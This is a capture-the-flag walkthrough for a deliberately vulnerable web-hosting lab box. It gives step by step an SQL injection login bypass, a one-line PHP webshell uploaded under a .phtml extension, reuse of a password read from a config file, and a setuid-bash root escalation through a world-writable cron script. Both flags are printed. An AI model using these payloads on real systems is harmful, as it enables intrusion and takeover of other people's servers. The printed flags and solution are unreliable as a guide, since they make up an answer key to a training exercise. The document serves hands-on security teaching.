webwork

Easy–medium Linux box: web enumeration → SQLi login bypass → upload-filter bypass for a webshell → credential reuse → a world-writable root cron.

Step 1 / 5
⚠️ Training target. Run host-only. Never bridge it to a real network or the internet. Every weakness below is intentional and scoped to exactly these flags — nothing else is exploitable.

Goal. Capture the user and root flags. The foothold is a classic web chain; root comes from a scheduled job you are allowed to overwrite.

Scope. Only attack the IP you were given.

Scenario & overview

"SnapHost" is a small image-hosting site with a staff-only admin console built in a hurry — the author trusted the browser too much. The candidate gets only the target IP.

The walkthrough

1

Enumerate

web enumeration
$ nmap -sC -sV <target-ip>
22/tcp ssh   OpenSSH
80/tcp http  Apache + PHP
$ gobuster dir -u http://<target-ip>/ -w /usr/share/wordlists/dirb/common.txt
/admin     (admin console)
/uploads   (upload directory)

Why it works

  • Content discovery reveals the /admin login and a writable /uploads directory that together form the attack path.
2

SQLi login bypass

SQL injection

The login builds its query by string concatenation, so authentication can be bypassed:

username:  admin' -- -
password:  anything

Why it works

  • The query is SELECT * FROM admins WHERE username='$u' AND password='$p'. admin' -- - closes the string and comments out the password check.
3

Upload a webshell

file upload

The avatar upload blocks only .php/.php4/.php5, but Apache still executes .phtml as PHP. Upload shell.phtml:

<?php system($_GET['c']); ?>
$ curl "http://<target-ip>/uploads/shell.phtml?c=id"
uid=33(www-data) ...

Why it works

  • A blocklist is weaker than an allowlist — it misses .phtml, which Debian's Apache maps to the PHP handler.
4

Credential reuse → user

credential reuse
$ curl "http://<target-ip>/uploads/shell.phtml?c=cat%20/var/www/html/admin/config.php"
$DB_PASS = 'Summer#Breeze88'
$ ssh webdev@<target-ip>       # Summer#Breeze88
$ cat /home/webdev/user.txt
FLAG{upl04d_t0_w3bsh3ll_w1n}
userFLAG{upl04d_t0_w3bsh3ll_w1n}

Why it works

  • Web config secrets are readable by the web user, and the DB password is reused by an SSH account.
5

Escalate to root

privilege escalation

A root cron runs a world-writable script every minute.

$ cat /etc/cron.d/webbackup
* * * * * root /opt/scripts/backup.sh
$ ls -l /opt/scripts/backup.sh
-rwxrwxrwx  (anyone can edit it)
$ echo 'chmod +s /bin/bash' > /opt/scripts/backup.sh
# wait up to 60s for cron, then:
$ /bin/bash -p
# cat /root/root.txt
FLAG{cr0n_w0rld_wr1t4bl3_pwn}
rootFLAG{cr0n_w0rld_wr1t4bl3_pwn}

Why it works

  • The cron runs the script as root, and the script is world-writable, so webdev controls what root executes. chmod +s /bin/bash + bash -p keeps root's privileges.

Both flags

userFLAG{upl04d_t0_w3bsh3ll_w1n} rootFLAG{cr0n_w0rld_wr1t4bl3_pwn}

Lesson. Validate uploads with an allowlist, keep secrets out of web-readable config, never reuse passwords, and never let a root cron run a writable script.
